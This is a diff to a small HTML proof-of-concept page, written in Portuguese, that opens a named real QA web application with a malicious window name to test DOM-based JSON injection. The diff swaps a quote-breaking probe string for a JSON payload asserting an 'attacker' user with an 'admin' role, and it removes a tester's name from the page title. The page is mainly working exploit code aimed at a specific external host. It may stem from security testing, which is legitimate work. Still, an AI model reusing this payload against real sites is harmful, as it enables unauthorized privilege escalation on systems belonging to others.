@@ -29,7 +29,7 @@
 </head>
 <body>
     <div class="container">
-        <h1>PoC - DOM-based JSON Injection - Alyce</h1>
+        <h1>PoC - DOM-based JSON Injection</h1>
         <p>Esta página abrirá a aplicação alvo com um nome de janela malicioso para testar a vulnerabilidade de injeção de JSON baseada no DOM.</p>
         <button onclick="openTarget()">Abrir Aplicação Alvo</button>
         <div id="status" class="status"></div>
@@ -38,7 +38,7 @@
     <script>
         function openTarget() {
             // Abrir a aplicação alvo com um nome de janela malicioso
-            window.open('https://qa.neoway.com.br/apps/', 'l2ojxhikwq%2527%2522`\'"/l2ojxhikwq/><l2ojxhikwq/\>kzm33rr2xu&');
+            window.open('https://qa.neoway.com.br/apps/', '{"user":"attacker","role":"admin"}');
             document.getElementById('status').innerHTML = 'Aplicação alvo aberta. Verifique a nova janela para ver se a injeção de JSON foi bem-sucedida.';
         }
 
@@ -54,4 +54,3 @@
     </script>
 </body>
 </html>
-
